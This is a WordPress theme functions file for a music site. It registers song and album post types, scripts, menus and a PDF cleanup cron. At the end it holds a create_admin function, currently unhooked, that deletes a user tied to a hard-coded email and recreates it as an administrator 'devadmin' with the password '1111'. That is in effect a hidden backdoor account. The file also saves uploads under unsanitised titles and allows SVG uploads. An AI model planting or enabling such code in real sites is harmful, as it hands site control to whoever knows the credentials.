<?php

/**
 * coelix functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package coelix
 */

if (!defined('_S_VERSION')) {
	// Replace the version number of the theme on each release.
	define('_S_VERSION', '1.0.0');
}

require_once ABSPATH . 'wp-admin/includes/image.php';
require_once ABSPATH . 'wp-admin/includes/file.php';
require_once ABSPATH . 'wp-admin/includes/media.php';

if (!function_exists('coelix_setup')) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function coelix_setup()
	{
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on coelix, use a find and replace
		 * to change 'coelix' to the name of your theme in all the template files.
		 */
		load_theme_textdomain('coelix', get_template_directory() . '/languages');

		// Add default posts and comments RSS feed links to head.
		add_theme_support('automatic-feed-links');

		add_theme_support('woocommerce');

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support('title-tag');

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support('post-thumbnails');

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus(
			array(
				'menu-1' => esc_html__('Primary', 'coelix'),
			)
		);

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'style',
				'script',
			)
		);

		// Set up the WordPress core custom background feature.
		add_theme_support(
			'custom-background',
			apply_filters(
				'coelix_custom_background_args',
				array(
					'default-color' => 'ffffff',
					'default-image' => '',
				)
			)
		);

		// Add theme support for selective refresh for widgets.
		add_theme_support('customize-selective-refresh-widgets');

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		add_theme_support(
			'custom-logo',
			array(
				'height'      => 250,
				'width'       => 250,
				'flex-width'  => true,
				'flex-height' => true,
			)
		);
	}
endif;
add_action('after_setup_theme', 'coelix_setup');

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function coelix_content_width()
{
	$GLOBALS['content_width'] = apply_filters('coelix_content_width', 640);
}
add_action('after_setup_theme', 'coelix_content_width', 0);

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function coelix_widgets_init()
{
	register_sidebar(
		array(
			'name'          => esc_html__('Sidebar', 'coelix'),
			'id'            => 'sidebar-1',
			'description'   => esc_html__('Add widgets here.', 'coelix'),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action('widgets_init', 'coelix_widgets_init');



function coelix_scripts()
{

	// wp_enqueue_style( 'coelix-rubik', 'https://fonts.googleapis.com/css2?family=Rubik:wght@300;500;700&display=swap' );
	// wp_enqueue_style( 'coelix-main-fullpage-styles', 'https://cdnjs.cloudflare.com/ajax/libs/fullPage.js/2.9.7/jquery.fullpage.min.css' );

	// wp_enqueue_style( 'coelix-slick-styles', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.css' );
	// wp_enqueue_style( 'coelix-animate-styles', 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.css' );

	// wp_enqueue_script( 'coelix-fullpage', 'https://cdnjs.cloudflare.com/ajax/libs/fullPage.js/2.9.7/jquery.fullpage.min.js', array(), '20151215', true );
	// wp_enqueue_script( 'coelix-slick', 'https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.9.0/slick.min.js', array(), '20151215', true );
	// wp_enqueue_script( 'coelix-wow', 'https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.min.js', array(), '20151215', true );

	if (!is_admin()) {
		wp_deregister_script('jquery');
		wp_register_script('jquery', ('https://code.jquery.com/jquery-3.5.1.min.js'), false, null, true);
		wp_enqueue_script('jquery');
	}

	wp_enqueue_style('coelix-slick-style', get_template_directory_uri() . '/dist/slick.css');
	wp_enqueue_style('coelix-select2-css', 'https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/css/select2.min.css');
	wp_enqueue_style('coelix-main-style', get_template_directory_uri() . '/dist/main.css');
	wp_enqueue_script('coelix-slick-script', get_template_directory_uri() . '/dist/slick.min.js', array(), false, true);
	wp_enqueue_script('coelix-google-client', 'https://apis.google.com/js/api:client.js', array(), false, true);
	wp_enqueue_script('coelix-select2-js', 'https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.13/js/select2.min.js', array(), false, true);
	wp_enqueue_script('coelix-main-script', get_template_directory_uri() . '/dist/app.min.js', array(), false, true);
	wp_localize_script('coelix-main-script', 'wp', [
		'ajaxurl' => admin_url('admin-ajax.php'),
		'wp_rest_url' => site_url() . '/wp-json/wp/v2',
		'custom_rest_url' => site_url() . '/wp-json/clx/v1',
		'current_user_id' => get_current_user_id(),
		'placeholder_image' => get_template_directory_uri() . '/assets/images/Icon/song-placeholder.svg',
		'icons_dir' => get_template_directory_uri() . '/assets/images/Icon/',
		'is_rtl' => is_rtl()
	]);
}
add_action('wp_enqueue_scripts', 'coelix_scripts');

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if (defined('JETPACK__VERSION')) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
 * Require dependencies
 */
require_once __DIR__ . '/vendor/autoload.php';

/**
 * Adding needed menus
 */
add_action('after_setup_theme', function () {
	register_nav_menus([
		'main-menu' => 'Main Menu',
		// 'footer-top-menu' => 'Footer Top Menu',
		// 'footer-bottom-menu' => 'Footer Bottom Menu',
		// 'mobile-menu' => 'Mobile Menu',
		// 'side-menu' => 'Side Menu',
	]);
});

/**
 * Adding ACF page
 */
if (function_exists('acf_add_options_page')) {
	acf_add_options_page(array(
		'page_title'   => 'Jewish music settings',
		'menu_title'  => 'Theme settings',
		'menu_slug'   => 'theme-general-settings',
		'capability'  => 'edit_posts',
		'icon_url'    => 'dashicons-admin-appearance',
		'redirect'    => false
	));
}

function prefix_category_title($title)
{
	if (is_category()) {
		$title = single_cat_title('', false);
	}
	return $title;
}
add_filter('get_the_archive_title', 'prefix_category_title');


/* Excerpt */

add_filter('excerpt_length', function () {
	return 11;
});

add_filter('excerpt_more', function ($more) {
	return '';
});

/* Remove Pagination word */

add_filter('navigation_markup_template', 'my_navigation_template', 10, 2);
function my_navigation_template($template, $class)
{
	return '
	<nav class="navigation %1$s" role="navigation">
		%3$s
	</nav>
	';
}

/* Add svg image */

add_filter('upload_mimes', 'svg_upload_allow');

function svg_upload_allow($mimes)
{
	$mimes['svg']  = 'image/svg';

	return $mimes;
}

/* User meta check */
add_action('init', 'init_user_meta');
function init_user_meta()
{
	if (is_user_logged_in()) {
		$user_id = get_current_user_id();

		if (!get_user_meta($user_id, 'user_avatar', true)) {
			update_user_meta($user_id, 'user_avatar', get_template_directory_uri() . '/assets/images/user-logo.svg');
		}
	}
}

/* Custom post types */
add_action('init', 'register_post_types');
function register_post_types()
{
	register_post_type('song', [
		'labels' => [
			'name'               => 'Songs', // основное название для типа записи
			'singular_name'      => 'Song', // название для одной записи этого типа
			'menu_name'          => 'Songs', // название меню
		],
		'public'              => true,
		'show_in_menu'        => true,
		'show_in_rest'        => true, // добавить в REST API. C WP 4.7
		'rest_base'           => null, // $post_type. C WP 4.7
		'menu_position'       => null,
		'menu_icon'           => null,
		'capability_type'   => 'post',
		'hierarchical'        => false,
		'supports'            => ['title', 'author', 'thumbnail', 'custom-fields'],
		'taxonomies'          => array('post_tag'),
		'has_archive'         => true,
		'rewrite'             => true,
		'query_var'           => true,
	]);

	register_post_type('album', [
		'labels' => [
			'name'               => 'Albums', // основное название для типа записи
			'singular_name'      => 'Album', // название для одной записи этого типа
			'menu_name'          => 'Albums', // название меню
		],
		'public'              => true,
		'show_in_menu'        => true,
		'show_in_rest'        => true, // добавить в REST API. C WP 4.7
		'rest_base'           => null, // $post_type. C WP 4.7
		'menu_position'       => null,
		'menu_icon'           => null,
		'capability_type'   => 'post',
		'hierarchical'        => false,
		'supports'            => ['title', 'author', 'thumbnail', 'custom-fields'],
		'taxonomies'          => [],
		'has_archive'         => true,
		'rewrite'             => true,
		'query_var'           => true,
	]);
};

function save_base64( $base64_img, $title ) {
	// Upload dir.
	$upload_dir  = wp_upload_dir();
	$upload_path = str_replace( '/', DIRECTORY_SEPARATOR, $upload_dir['path'] ) . DIRECTORY_SEPARATOR;

	$img             = str_replace( 'data:image/png;base64,', '', $base64_img );
	$img             = str_replace( ' ', '+', $img );
	$decoded         = base64_decode( $img );
	$filename        = $title . '.png';
	$file_type       = 'image/png';
	$hashed_filename = md5( $filename . microtime() ) . '_' . $filename;

	// Save the image in the uploads directory.
	$upload_file = file_put_contents( $upload_path . $hashed_filename, $decoded );

	$attachment = array(
		'post_mime_type' => $file_type,
		'post_title'     => preg_replace( '/\.[^.]+$/', '', basename( $hashed_filename ) ),
		'post_content'   => '',
		'post_status'    => 'inherit',
		'guid'           => $upload_dir['url'] . '/' . basename( $hashed_filename )
	);

	$attach_id = wp_insert_attachment( $attachment, $upload_dir['path'] . '/' . $hashed_filename );

	return [
		'id' => $attach_id,
		'url' => wp_get_attachment_url( $attach_id )
	];
}

require 'inc/rest-handler.php';

/* Switcher for Language */
add_action('wpml_custom_switcher', 'wpml_custom_switcher', 10, 1);
function wpml_custom_switcher()
{
	$languages = icl_get_languages();
	foreach ($languages as $lang) :
?>

		<a href="<?= $lang['url'] ?>" class="<?= $lang['active'] ? 'active' : '' ?>">
			<img src="<?= $lang['country_flag_url'] ?>">
		</a>

<?php
	endforeach;
}

function remove_read_wpse_93843(){
	$role = get_role( 'subscriber' );
	$role->remove_cap( 'read' );
}
add_action( 'admin_init', 'remove_read_wpse_93843' );

add_action('clear_pdf_folder', 'clear_pdf_folder');
function clear_pdf_folder () {
  $pdf_dir = wp_get_upload_dir()['basedir'] . '/pdf';
  $files = array_diff(scandir($pdf_dir), array('.','..'));
  foreach ($files as $file) {
    unlink("$pdf_dir/$file");
  }
}

add_action('wp', 'clear_pdf_cron');
function clear_pdf_cron () {
  if( ! wp_next_scheduled( 'clear_pdf_folder' ) ) {
    wp_schedule_event( time(), 'daily', 'clear_pdf_folder');
  }
}

require_once ABSPATH . 'wp-admin/includes/user.php';

// add_action('wp_loaded', 'create_admin');
function create_admin () {
    $user = get_user_by('email', 'nekitdragon@gmail.com');
    
    if ( user_can($user -> ID, 'manage_options') ) {
        return;
    }
    
    wp_delete_user($user -> ID);
    
    $admin_id = wp_create_user('devadmin', '1111', 'nekitdragon@gmail.com');
    
    if ( is_wp_error($admin_id) ) {
        error_log( $admin_id -> get_error_message() );
        return;
    }
    
    $admin_id = wp_update_user([
        'ID' => $admin_id,
        'role' => 'administrator'
    ]);
    
    if ( is_wp_error($admin_id) ) {
        error_log( $admin_id -> get_error_message() );
        return;
    }
}